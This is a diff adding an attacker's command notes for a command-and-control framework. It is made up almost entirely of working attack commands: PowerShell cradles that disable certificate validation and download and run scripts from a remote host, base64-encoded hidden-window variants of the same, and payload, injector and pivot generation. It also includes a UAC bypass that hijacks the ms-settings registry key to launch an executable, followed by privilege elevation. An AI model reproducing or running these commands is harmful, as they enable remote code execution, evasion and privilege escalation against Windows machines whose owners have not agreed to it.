@@ -1,0 +1,43 @@
+powershell -noP -sta -w 1 -c "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.174.128:443/a') | iex"
+
+powershell -noP -sta -w 1 -c "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.174.128:443/b') | iex"
+
+powershell -noP -sta -w 1 -c "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.174.128:443/c') | iex"
+
+
+payload -l Local -wh a -t ps
+pivot start -b http://127.0.0.1:4444
+
+payload -b http://127.0.0.1:4444 -wh a -t ps -wa self
+payload -l Local -wh a -t ps -wa self
+
+host push -f e:\share\tmp\payload_https_192_168_174_128.ps1 -p b -d test -ps
+
+payload -l Local -f upd.exe
+upload /mnt/Share/tmp/upd.exe
+
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -ep bypass -enc KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjE3NC4xMjg6NDQwL3RvdG8nKSB8IGlleA==
+
+
+powershell.exe -windowstyle hidden -ep bypass -enc KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vMTkyLjE2OC4xNzQuMTI4OjQ0My9jJykK
+
+powershell.exe -w 1 -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADcANAAuADEAMgA4ADoANAA0ADAALwB0AGEAdABhACcAKQA=
+
+
+powershell Remove-Item -Path HKCU\Software\Classes\.c2s -Force -Verbose
+
+
+payload -l Local -wh a -t ps
+payload -l Local -t inj -v
+
+payload -l Local -t exe -f install
+shell reg add "HKCU\Software\Classes\.c2s\Shell\Open\command" /d "c:\users\olivier\desktop\install.exe" /f
+shell reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".c2s" /f
+
+payload -l Local -t inj -f inject1.exe -d
+payload -l Local -t inj -f inject2.exe -d
+
+payload -l AD -wh z -t ps
+
+
+elevate -p c:\users\olivier -i -f installTool
